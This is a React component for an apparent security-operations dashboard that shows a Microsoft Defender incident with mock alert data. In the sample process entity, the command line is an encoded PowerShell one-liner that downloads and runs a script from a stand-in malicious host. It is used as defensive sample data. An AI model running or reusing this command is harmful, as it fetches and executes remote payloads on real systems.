import React, { useState, useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { 
  Shield, ArrowLeft, AlertTriangle, User, Clock, Server, MessageSquare,
  Send, CheckCircle, Activity, ExternalLink, Terminal, Globe, Hash,
  Calendar, FileText
} from "lucide-react";

// ACTUAL API Config
const SEVERITY_CONFIG = {
  High: { color: "#ff0844", icon: AlertTriangle, label: "High" },
  Medium: { color: "#ffaa00", icon: AlertTriangle, label: "Medium" },
  Low: { color: "#00d9ff", icon: AlertTriangle, label: "Low" },
  Informational: { color: "#7a8599", icon: AlertTriangle, label: "Informational" }
};

const STATUS_CONFIG = {
  New: { color: "#ff0844", icon: AlertTriangle, label: "New" },
  Active: { color: "#00d9ff", icon: Activity, label: "Active" },
  Resolved: { color: "#00ff88", icon: CheckCircle, label: "Resolved" }
};

const MOCK_ANALYSTS = [
  { email: "sarah.chen@company.com", name: "Sarah Chen" },
  { email: "mike.rodriguez@company.com", name: "Mike Rodriguez" },
  { email: "emma.thompson@company.com", name: "Emma Thompson" }
];

export default function IncidentDetail() {
  const navigate = useNavigate();
  const { incidentId } = useParams();
  const [status, setStatus] = useState("Active");
  const [assignedTo, setAssignedTo] = useState("sarah.chen@company.com");
  const [newComment, setNewComment] = useState("");
  const [comments, setComments] = useState([
    {
      comment: "[SOC DASHBOARD NOTE]: Initial triage completed. Device isolated.",
      createdBy: "sarah.chen@company.com",
      createdTime: new Date(Date.now() - 3600000).toISOString()
    },
    {
      comment: "[SOC DASHBOARD NOTE]: Confirmed malicious. User credentials reset.",
      createdBy: "mike.rodriguez@company.com",
      createdTime: new Date(Date.now() - 1800000).toISOString()
    }
  ]);

  // Mock incident data - MATCHES ACTUAL API STRUCTURE
  const incident = {
    incidentId: incidentId || "924565",
    incidentName: "Suspicious PowerShell command line",
    createdTime: "2020-09-06T14:46:57.0733333Z",
    lastUpdateTime: "2020-09-06T14:46:57.29Z",
    assignedTo: assignedTo,
    classification: "TruePositive",
    determination: "Malware",
    status: status,
    severity: "High",
    tags: ["Defender XDR", "Auto-Detected"],
    alerts: [
      {
        alertId: "alert-001",
        title: "Suspicious PowerShell command line",
        description: "Detected encoded PowerShell attempting to download malicious payload",
        category: "Malware",
        severity: "High",
        serviceSource: "MicrosoftDefenderForEndpoint",
        detectionSource: "CustomTI",
        entities: [
          {
            entityType: "Process",
            fileName: "powershell.exe",
            filePath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
            processId: 4567,
            processCommandLine: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
            parentProcessFileName: "explorer.exe",
            sha1: "abc123def456...",
            sha256: "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890"
          },
          {
            entityType: "File",
            fileName: "update.exe",
            filePath: "C:\\Users\\john.doe\\AppData\\Local\\Temp\\update.exe",
            sha256: "f9e8d7c6b5a4938271605f4e3d2c1b0a9f8e7d6c5b4a3928170605f4e3d2c1b0a"
          },
          {
            entityType: "Ip",
            ipAddress: "185.220.101.45"
          },
          {
            entityType: "User",
            accountName: "john.doe",
            userPrincipalName: "john.doe@company.com",
            userSid: "S-1-5-21-..."
          }
        ],
        deviceId: "WS-FINANCE-001",
        deviceName: "WS-FINANCE-001",
        userPrincipalName: "john.doe@company.com",
        accountName: "john.doe"
      }
    ],
    comments: comments,
    // CRITICAL: Deep link URL
    webUrl: `https://security.microsoft.com/incidents/${incidentId}?tid=your-tenant-id`
  };

  const severityConfig = SEVERITY_CONFIG[incident.severity];
  const statusConfig = STATUS_CONFIG[incident.status];

  // Handle assignment (syncs to Defender via Graph API)
  const handleAssign = async (email) => {
    setAssignedTo(email);
    
    // In production:
    // await fetch(`https://graph.microsoft.com/v1.0/security/incidents/${incidentId}`, {
    //   method: 'PATCH',
    //   headers: {
    //     'Authorization': `Bearer ${accessToken}`,
    //     'Content-Type': 'application/json'
    //   },
    //   body: JSON.stringify({ assignedTo: email })
    // });
  };

  // Handle status change (syncs to Defender)
  const handleStatusChange = async (newStatus) => {
    setStatus(newStatus);
    
    // In production:
    // await fetch(`https://graph.microsoft.com/v1.0/security/incidents/${incidentId}`, {
    //   method: 'PATCH',
    //   body: JSON.stringify({ status: newStatus })
    // });
  };

  // Add comment (posts to Defender with [SOC DASHBOARD NOTE] prefix)
  const addComment = async () => {
    if (!newComment.trim()) return;
    
    const comment = {
      comment: `[SOC DASHBOARD NOTE]: ${newComment}`,
      createdBy: "current.user@company.com",
      createdTime: new Date().toISOString()
    };
    
    setComments([...comments, comment]);
    setNewComment("");
    
    // In production:
    // await fetch(`https://graph.microsoft.com/v1.0/security/incidents/${incidentId}/comments`, {
    //   method: 'POST',
    //   body: JSON.stringify({ comment: `[SOC DASHBOARD NOTE]: ${newComment}` })
    // });
  };

  // Get first alert
  const alert = incident.alerts[0];

  return (
    <div style={{
      width: "100vw",
      height: "100vh",
      background: "#050810",
      color: "#e0e6f0",
      fontFamily: "monospace",
      overflow: "hidden",
      display: "flex",
      flexDirection: "column"
    }}>
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0e1a; }
        ::-webkit-scrollbar-thumb { background: #1a2332; border-radius: 4px; }
        ::selection { background: #00d9ff; color: #000; }
      `}</style>


      {/* Main Content */}
      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
        {/* Left Panel */}
        <div style={{
          flex: 2,
          overflowY: "auto",
          padding: "24px",
          display: "flex",
          flexDirection: "column",
          gap: "20px"
        }}>
          {/* Deep Link Button (CRITICAL FEATURE) */}
          <a 
            href={incident.webUrl}
            target="_blank"
            rel="noopener noreferrer"
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
              padding: "14px",
              background: "#0078d4", // Microsoft Blue
              color: "white",
              border: "none",
              borderRadius: "6px",
              textDecoration: "none",
              fontWeight: 600,
              fontSize: "13px",
              cursor: "pointer",
              boxShadow: "0 4px 12px rgba(0, 120, 212, 0.3)",
              transition: "all 0.2s"
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.background = "#005a9e";
              e.currentTarget.style.transform = "translateY(-2px)";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.background = "#0078d4";
              e.currentTarget.style.transform = "translateY(0)";
            }}
          >
            <ExternalLink size={16} />
            Open in Microsoft Defender XDR Portal
          </a>

          {/* Title */}
          <div>
            <h1 style={{ fontSize: "18px", fontWeight: 600, marginBottom: "8px", color: "#e0e6f0" }}>
              {incident.incidentName}
            </h1>
            <p style={{ fontSize: "12px", color: "#7a8599", lineHeight: 1.6 }}>
              {alert.description}
            </p>
          </div>

          {/* Quick Status Actions */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Status Actions
            </h3>
            <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
              {Object.entries(STATUS_CONFIG).map(([key, config]) => (
                <button
                  key={key}
                  onClick={() => handleStatusChange(key)}
                  style={{
                    padding: "8px 14px",
                    background: status === key ? `${config.color}20` : "#050810",
                    border: `1px solid ${status === key ? config.color : "#1a2332"}`,
                    borderRadius: "4px",
                    color: status === key ? config.color : "#7a8599",
                    fontSize: "11px",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    gap: "6px",
                    fontWeight: status === key ? 600 : 400
                  }}
                >
                  <config.icon size={12} />
                  {config.label}
                </button>
              ))}
            </div>
          </div>

          {/* Incident Info */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Incident Information
            </h3>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: "12px", fontSize: "11px" }}>
              {[
                { icon: Calendar, label: "Created", value: new Date(incident.createdTime).toLocaleString() },
                { icon: Calendar, label: "Last Updated", value: new Date(incident.lastUpdateTime).toLocaleString() },
                { icon: FileText, label: "Classification", value: incident.classification },
                { icon: FileText, label: "Determination", value: incident.determination },
                { icon: Server, label: "Device", value: alert.deviceName },
                { icon: User, label: "User", value: alert.accountName }
              ].map((item, i) => (
                <div key={i} style={{
                  background: "#050810",
                  border: "1px solid #1a2332",
                  borderRadius: "4px",
                  padding: "10px",
                  display: "flex",
                  alignItems: "start",
                  gap: "10px"
                }}>
                  <item.icon size={14} style={{ color: "#7a8599", marginTop: "2px" }} />
                  <div>
                    <div style={{ color: "#7a8599", fontSize: "9px", marginBottom: "4px" }}>{item.label}</div>
                    <div style={{ color: "#e0e6f0", fontWeight: 600 }}>{item.value}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Alert Entities (IOCs from API) */}
          <div style={{
            background: "#0a0e1a",
            border: "1px solid #1a2332",
            borderRadius: "6px",
            padding: "16px"
          }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Alert Entities
            </h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "10px", fontSize: "11px" }}>
              {alert.entities.map((entity, i) => {
                let displayData = [];
                
                if (entity.entityType === "Process") {
                  displayData = [
                    { label: "File Name", value: entity.fileName, icon: Terminal },
                    { label: "File Path", value: entity.filePath, icon: FileText },
                    { label: "Command Line", value: entity.processCommandLine, icon: Terminal },
                    { label: "Parent Process", value: entity.parentProcessFileName, icon: Terminal },
                    { label: "SHA-256", value: entity.sha256, icon: Hash }
                  ];
                } else if (entity.entityType === "File") {
                  displayData = [
                    { label: "File Name", value: entity.fileName, icon: FileText },
                    { label: "File Path", value: entity.filePath, icon: FileText },
                    { label: "SHA-256", value: entity.sha256, icon: Hash }
                  ];
                } else if (entity.entityType === "Ip") {
                  displayData = [
                    { label: "IP Address", value: entity.ipAddress, icon: Globe }
                  ];
                } else if (entity.entityType === "User") {
                  displayData = [
                    { label: "Account Name", value: entity.accountName, icon: User },
                    { label: "UPN", value: entity.userPrincipalName, icon: User }
                  ];
                }

                return (
                  <div key={i} style={{
                    background: "#050810",
                    border: "1px solid #1a2332",
                    borderRadius: "4px",
                    padding: "12px"
                  }}>
                    <div style={{
                      fontSize: "10px",
                      color: "#00d9ff",
                      fontWeight: 600,
                      marginBottom: "8px",
                      textTransform: "uppercase"
                    }}>
                      {entity.entityType}
                    </div>
                    {displayData.map((item, j) => (
                      <div key={j} style={{ marginBottom: "6px" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "2px" }}>
                          <item.icon size={10} style={{ color: "#7a8599" }} />
                          <span style={{ color: "#7a8599", fontSize: "9px" }}>{item.label}</span>
                        </div>
                        <code style={{ 
                          color: "#e0e6f0", 
                          fontSize: "10px", 
                          fontFamily: "monospace",
                          wordBreak: "break-all",
                          display: "block",
                          paddingLeft: "16px"
                        }}>
                          {item.value}
                        </code>
                      </div>
                    ))}
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        {/* Right Panel - Assignment & Comments */}
        <div style={{
          flex: 1,
          borderLeft: "1px solid #1a2332",
          background: "#0a0e1a",
          display: "flex",
          flexDirection: "column",
          overflow: "hidden"
        }}>
          {/* Assignment */}
          <div style={{ padding: "16px", borderBottom: "1px solid #1a2332" }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "10px", color: "#00d9ff", textTransform: "uppercase" }}>
              Assigned To
            </h3>
            <select
              value={assignedTo}
              onChange={(e) => handleAssign(e.target.value)}
              style={{
                width: "100%",
                padding: "10px",
                background: "#050810",
                border: "1px solid #1a2332",
                borderRadius: "4px",
                color: "#e0e6f0",
                fontSize: "11px"
              }}
            >
              <option value="">Unassigned</option>
              {MOCK_ANALYSTS.map(analyst => (
                <option key={analyst.email} value={analyst.email}>
                  {analyst.name}
                </option>
              ))}
            </select>
          </div>

          {/* Comments */}
          <div style={{ flex: 1, overflowY: "auto", padding: "16px" }}>
            <h3 style={{ fontSize: "11px", fontWeight: 600, marginBottom: "12px", color: "#00d9ff", textTransform: "uppercase" }}>
              Investigation Notes ({comments.length})
            </h3>
            <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
              {comments.map((comment, i) => (
                <div key={i} style={{
                  background: "#050810",
                  border: "1px solid #1a2332",
                  borderRadius: "4px",
                  padding: "12px"
                }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "6px", marginBottom: "6px" }}>
                    <span style={{ fontSize: "10px", fontWeight: 600, color: "#00d9ff" }}>
                      {comment.createdBy.split('@')[0]}
                    </span>
                    <span style={{ fontSize: "9px", color: "#7a8599" }}>
                      {new Date(comment.createdTime).toLocaleString()}
                    </span>
                  </div>
                  <p style={{ fontSize: "11px", color: "#e0e6f0", lineHeight: 1.5 }}>
                    {comment.comment}
                  </p>
                </div>
              ))}
            </div>
          </div>

          {/* Add Comment */}
          <div style={{ padding: "16px", borderTop: "1px solid #1a2332" }}>
            <textarea
              placeholder="Add shift notes (will sync to Defender with [SOC DASHBOARD NOTE] prefix)..."
              value={newComment}
              onChange={(e) => setNewComment(e.target.value)}
              rows={3}
              style={{
                width: "100%",
                padding: "10px",
                background: "#050810",
                border: "1px solid #1a2332",
                borderRadius: "4px",
                color: "#e0e6f0",
                fontSize: "11px",
                resize: "none",
                marginBottom: "8px",
                fontFamily: "monospace"
              }}
            />
            <button
              onClick={addComment}
              style={{
                width: "100%",
                padding: "10px",
                background: "#00d9ff",
                border: "none",
                borderRadius: "4px",
                color: "#000",
                fontSize: "11px",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "6px"
              }}
            >
              <Send size={12} />
              Add Note
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
